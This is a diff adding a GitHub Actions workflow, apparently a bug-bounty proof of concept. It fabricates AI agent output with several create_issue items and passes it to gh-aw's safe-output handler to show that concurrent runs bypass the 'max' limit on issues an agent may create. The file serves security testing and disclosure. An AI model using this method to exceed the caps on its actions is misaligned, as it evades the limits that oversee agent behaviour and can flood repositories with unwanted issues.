@@ -1,0 +1,84 @@
+name: "Safe Outputs Max Bypass Test"
+
+on:
+  workflow_dispatch:
+    inputs:
+      instance_id:
+        description: "Unique ID per concurrent run"
+        required: true
+        default: "1"
+      max_value:
+        description: "max constraint on create_issue"
+        required: false
+        default: "1"
+      item_count:
+        description: "Items per agent output file"
+        required: false
+        default: "1"
+
+jobs:
+  safe_outputs:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      issues: write
+    env:
+      GH_AW_WORKFLOW_ID: "max-bypass-test"
+      GH_AW_WORKFLOW_NAME: "Max Bypass Test"
+      GH_AW_CALLER_WORKFLOW_ID: "BH00001/bugbounty-test-public/max-bypass-test"
+      GH_AW_ENGINE_ID: "copilot"
+      GH_AW_ENGINE_MODEL: "unknown"
+      GH_AW_ENGINE_VERSION: "1.0.0"
+    steps:
+      - name: Checkout gh-aw actions folder
+        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
+        with:
+          repository: github/gh-aw
+          sparse-checkout: |
+            actions
+          persist-credentials: false
+
+      - name: Setup Scripts
+        id: setup
+        uses: ./actions/setup
+        with:
+          destination: ${{ runner.temp }}/gh-aw/actions
+
+      - name: Prepare crafted agent output
+        run: |
+          mkdir -p /tmp/gh-aw
+          COUNT=${{ github.event.inputs.item_count || 1 }}
+          INSTANCE=${{ github.event.inputs.instance_id }}
+          MAXVAL=${{ github.event.inputs.max_value || 1 }}
+          echo -n '{"items":[' > /tmp/gh-aw/agent_output.json
+          for i in $(seq 1 $COUNT); do
+            if [ $i -gt 1 ]; then echo -n ',' >> /tmp/gh-aw/agent_output.json; fi
+            printf '{"type":"create_issue","title":"[MAX BYPASS] run %s item %s","body":"This issue proves \\`max: %s\\` constraint bypassed via concurrent runs.\\n\\n- **Instance**: %s\\n- **Item**: %s\\n- **Run ID**: %s\\n- **Run URL**: %s/%s/actions/runs/%s"}\n' \
+              "$INSTANCE" "$i" "$MAXVAL" "$INSTANCE" "$i" \
+              "${{ github.run_id }}" "${{ github.server_url }}" "${{ github.repository }}" "${{ github.run_id }}" >> /tmp/gh-aw/agent_output.json
+          done
+          echo ']}' >> /tmp/gh-aw/agent_output.json
+          echo "=== Agent output ==="
+          cat /tmp/gh-aw/agent_output.json
+
+      - name: Process Safe Outputs
+        id: process
+        uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c379ccdee
+        env:
+          GH_AW_AGENT_OUTPUT: /tmp/gh-aw/agent_output.json
+          GH_AW_SAFE_OUTPUTS_HANDLER_CONFIG: '{"create_issue":{"max":${{ github.event.inputs.max_value || 1 }},"labels":["max-bypass","bug-bounty"],"title_prefix":"[MAX BYPASS] "}}'
+        with:
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+          script: |
+            const { setupGlobals } = require('${{ runner.temp }}/gh-aw/actions/setup_globals.cjs');
+            setupGlobals(core, github, context, exec, io, getOctokit);
+            const { main } = require('${{ runner.temp }}/gh-aw/actions/safe_output_handler_manager.cjs');
+            await main();
+
+      - name: Report
+        if: always()
+        run: |
+          echo "## Result" >> $GITHUB_STEP_SUMMARY
+          echo "- **Instance**: ${{ github.event.inputs.instance_id }}" >> $GITHUB_STEP_SUMMARY
+          echo "- **max**: ${{ github.event.inputs.max_value }}" >> $GITHUB_STEP_SUMMARY
+          echo "- **Run**: ${{ github.run_id }}" >> $GITHUB_STEP_SUMMARY
